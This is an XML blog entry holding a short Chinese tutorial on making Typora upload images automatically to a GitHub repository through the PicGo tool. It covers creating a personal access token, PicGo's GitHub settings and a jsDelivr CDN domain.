    <content type="html"><![CDATA[<p>前几天上传文章到bbs,被本地图片搞到吐血了，所以学了下用插件直接将图片上传到github图床</p><h1 id="所用工具"><a href="#所用工具" class="headerlink" title="所用工具:"></a>所用工具:</h1><p>typora和一个Github仓库和一个github token和PicGo和一个加速github访问的网站jsdelivr</p><h1 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h1><p>1.现在github建立一个公开的仓库，不要建私人仓库，picgo访问不了</p><p>2.在个人设置里的Developer setting里创建一个新的personal token,并将select scope中的repo打勾</p><p>3.将token保存好后，去github下载PicGo插件，PicGo下载网站</p><p>4.安装完后打开PicGO的图床中的Github图床设置<br><img src="https://s2.loli.net/2022/01/03/uklUb4XjA8TLxJv.png" alt="屏幕截图 2021-12-20 203043.png"></p><blockquote><p>其中仓库名要对应到Github的ID<br>指定存储路径一定要是xxxx&#x2F;(少了&#x2F;不行)<br>最后一行自定义域名可以使用jsdelivr加速下，域名格式为：<a href="https://cdn-jsdelivr-net.webvpn.nefu.edu.cn/gh/Github%E7%9A%84ID/%E4%BD%A0%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D">https://cdn-jsdelivr-net.webvpn.nefu.edu.cn/gh/Github的ID/你的仓库名</a><br>设置完记得打开PicGo设置里的时间戳重命名</p></blockquote><p>然后打开typora的设置，点击图像，并把图像保存设置为上传，打勾第一个 第二个 和第四个，将应用地址选到你安装PicGo的文件夹</p><p>然后以后直接复制源代码就行了 😀</p>]]></content>
    
    
    
    <tags>
      
      <tag>小知识</tag>
      
      <tag>typora使用技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
